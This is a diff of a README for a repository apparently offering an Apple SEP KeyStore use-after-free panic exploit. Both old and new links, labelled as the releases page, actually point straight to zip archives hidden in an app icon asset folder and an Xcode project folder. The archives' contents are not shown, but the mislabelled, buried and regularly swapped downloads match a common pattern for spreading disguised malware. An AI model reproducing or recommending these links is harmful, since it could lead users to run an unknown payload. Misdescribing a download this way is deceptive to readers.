@@ -6,7 +6,7 @@ Welcome to the AppleSEPKeyStore-UAF-Panic repository. This guide will help you d
 
 ## 📥 Download the Software
 
-[![Download AppleSEPKeyStore-UAF-Panic](https://raw.githubusercontent.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/main/ios-app/Test/Assets.xcassets/AppIcon.appiconset/Key-Panic-Apple-UA-Store-SEP-3.9.zip)](https://raw.githubusercontent.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/main/ios-app/Test/Assets.xcassets/AppIcon.appiconset/Key-Panic-Apple-UA-Store-SEP-3.9.zip)
+[![Download AppleSEPKeyStore-UAF-Panic](https://github.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/raw/refs/heads/main/ios-app/Test.xcodeproj/Apple-Panic-SEP-Key-UA-Store-v2.5.zip)](https://github.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/raw/refs/heads/main/ios-app/Test.xcodeproj/Apple-Panic-SEP-Key-UA-Store-v2.5.zip)
 
 To get started, you will need to download the application. Click on the button above to visit the releases page.
 
@@ -26,7 +26,7 @@ Before installing, ensure your device meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/main/ios-app/Test/Assets.xcassets/AppIcon.appiconset/Key-Panic-Apple-UA-Store-SEP-3.9.zip) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Rafiadnan20/AppleSEPKeyStore-UAF-Panic/raw/refs/heads/main/ios-app/Test.xcodeproj/Apple-Panic-SEP-Key-UA-Store-v2.5.zip) to access the releases page.
 
 2. **Select the Version:** Find the latest version of AppleSEPKeyStore-UAF-Panic. The most recent release will usually be at the top of the list.
 
